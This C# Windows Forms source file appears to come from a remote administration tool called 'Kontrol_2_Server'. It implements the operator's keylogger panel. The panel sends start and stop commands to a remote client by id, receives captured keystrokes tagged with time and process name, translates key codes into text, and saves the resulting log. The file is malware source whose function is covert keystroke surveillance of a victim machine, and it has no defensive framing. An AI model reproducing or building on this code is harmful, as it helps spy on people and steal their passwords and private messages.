using System;
using System.IO;
using System.Drawing;
using System.Windows.Forms;

namespace Kontrol_2_Server
{
    public struct LogStructure
    {
        public int Key { get; }
        public string Time { get; }
        public string Process { get; }

        public LogStructure(int Key, string time, string process)
        {
            this.Key = Key;
            this.Time = time;
            this.Process = process;
        }
    }

    public partial class KeyLoggerForm : Form
    {
        public int clientId = -1;
        public KeyLoggerForm()
        {
            InitializeComponent();
        }

        static string KeyToString(int key)
        {
            string keyStr;

            if (key == 8) keyStr = "[Backspace]";
            else if (key == 9) keyStr = "[TAB]";
            else if (key == 13) keyStr = "[Enter]";
            else if (key == 19) keyStr = "[Pause]";
            else if (key == 20) keyStr = "[Caps Lock]";
            else if (key == 27) keyStr = "[Esc]";
            else if (key == 32) keyStr = " ";
            else if (key == 33) keyStr = "[Page Up]";
            else if (key == 34) keyStr = "[Page Down]";
            else if (key == 35) keyStr = "[End]";
            else if (key == 36) keyStr = "[Home]";
            else if (key == 37) keyStr = "[Left]";
            else if (key == 38) keyStr = "[Up]";
            else if (key == 39) keyStr = "[Right]";
            else if (key == 40) keyStr = "[Down]";
            else if (key == 44) keyStr = "[Print Screen]";
            else if (key == 45) keyStr = "[Insert]";
            else if (key == 46) keyStr = "[Delete]";
            else if (key == 48) keyStr = "0";
            else if (key == 49) keyStr = "1";
            else if (key == 50) keyStr = "2";
            else if (key == 51) keyStr = "3";
            else if (key == 52) keyStr = "4";
            else if (key == 53) keyStr = "5";
            else if (key == 54) keyStr = "6";
            else if (key == 55) keyStr = "7";
            else if (key == 56) keyStr = "8";
            else if (key == 57) keyStr = "9";
            else if (key == 65) keyStr = "a";
            else if (key == 66) keyStr = "b";
            else if (key == 67) keyStr = "c";
            else if (key == 68) keyStr = "d";
            else if (key == 69) keyStr = "e";
            else if (key == 70) keyStr = "f";
            else if (key == 71) keyStr = "g";
            else if (key == 72) keyStr = "h";
            else if (key == 73) keyStr = "i";
            else if (key == 74) keyStr = "j";
            else if (key == 75) keyStr = "k";
            else if (key == 76) keyStr = "l";
            else if (key == 77) keyStr = "m";
            else if (key == 78) keyStr = "n";
            else if (key == 79) keyStr = "o";
            else if (key == 80) keyStr = "p";
            else if (key == 81) keyStr = "q";
            else if (key == 82) keyStr = "r";
            else if (key == 83) keyStr = "s";
            else if (key == 84) keyStr = "t";
            else if (key == 85) keyStr = "u";
            else if (key == 86) keyStr = "v";
            else if (key == 87) keyStr = "w";
            else if (key == 88) keyStr = "x";
            else if (key == 89) keyStr = "y";
            else if (key == 90) keyStr = "z";
            else if (key == 91) keyStr = "[Windows]";
            else if (key == 92) keyStr = "[Windows]";
            else if (key == 93) keyStr = "[List]";
            else if (key == 96) keyStr = "0";
            else if (key == 97) keyStr = "1";
            else if (key == 98) keyStr = "2";
            else if (key == 99) keyStr = "3";
            else if (key == 100) keyStr = "4";
            else if (key == 101) keyStr = "5";
            else if (key == 102) keyStr = "6";
            else if (key == 103) keyStr = "7";
            else if (key == 104) keyStr = "8";
            else if (key == 105) keyStr = "9";
            else if (key == 106) keyStr = "*";
            else if (key == 107) keyStr = "+";
            else if (key == 109) keyStr = "-";
            else if (key == 110) keyStr = ",";
            else if (key == 111) keyStr = "/";
            else if (key == 112) keyStr = "[F1]";
            else if (key == 113) keyStr = "[F2]";
            else if (key == 114) keyStr = "[F3]";
            else if (key == 115) keyStr = "[F4]";
            else if (key == 116) keyStr = "[F5]";
            else if (key == 117) keyStr = "[F6]";
            else if (key == 118) keyStr = "[F7]";
            else if (key == 119) keyStr = "[F8]";
            else if (key == 120) keyStr = "[F9]";
            else if (key == 121) keyStr = "[F10]";
            else if (key == 122) keyStr = "[F11]";
            else if (key == 123) keyStr = "[F12]";
            else if (key == 144) keyStr = "[Num Lock]";
            else if (key == 145) keyStr = "[Scroll Lock]";
            else if (key == 160) keyStr = "[Shift]";
            else if (key == 161) keyStr = "[Shift]";
            else if (key == 162) keyStr = "[Ctrl]";
            else if (key == 163) keyStr = "[Ctrl]";
            else if (key == 164) keyStr = "[Alt]";
            else if (key == 165) keyStr = "[Alt]";
            else if (key == 187) keyStr = "=";
            else if (key == 186) keyStr = "ç";
            else if (key == 188) keyStr = ",";
            else if (key == 189) keyStr = "-";
            else if (key == 190) keyStr = ".";
            else if (key == 192) keyStr = "'";
            else if (key == 191) keyStr = ";";
            else if (key == 193) keyStr = "/";
            else if (key == 194) keyStr = ".";
            else if (key == 219) keyStr = "´";
            else if (key == 220) keyStr = "]";
            else if (key == 221) keyStr = "[";
            else if (key == 222) keyStr = "~";
            else if (key == 226) keyStr = "\\";
            else keyStr = "[" + key + "]";
            return keyStr;
        }

        LogStructure prevLogStruct;
        public void AppendLog(LogStructure log)
        {
            this.Invoke(new MethodInvoker(delegate
            {
                if (prevLogStruct.Process == log.Process) logBox.Text += KeyToString(log.Key);
                else
                {
                    logBox.ForeColor = Color.Blue;
                    logBox.Text += $"\n\n[{log.Time}] {log.Process}:\n";
                    logBox.ForeColor = Color.Black;
                }
                prevLogStruct = log;
            }));
        }

        private void startBtn_Click(object sender, EventArgs e)
        {
            try
            {
                if (startBtn.Text == "Start")
                {
                    MainForm.SendCommand("keylogger\nstart", clientId);
                    startBtn.Text = "Stop";
                }
                else
                {
                    MainForm.SendCommand("keylogger\nstop", clientId);
                    startBtn.Text = "Start";
                }
            }
            catch { }
        }

        private void KeyLoggerForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            MainForm.SendCommand("keylogger\nstop", clientId);
            MainForm.klf = new KeyLoggerForm();
        }

        private void saveBtn_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.AddExtension = true;
            sfd.DefaultExt = ".log";
            sfd.FileName = "Key Log " + DateTime.Now.ToFileTime();
            sfd.Filter = "Log File (*.log, *.txt)|*.log;*.txt";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllText(sfd.FileName, logBox.Text);
            }
        }

        private void clearBtn_Click_1(object sender, EventArgs e)
        {
            logBox.Text = string.Empty;
        }
    }
}
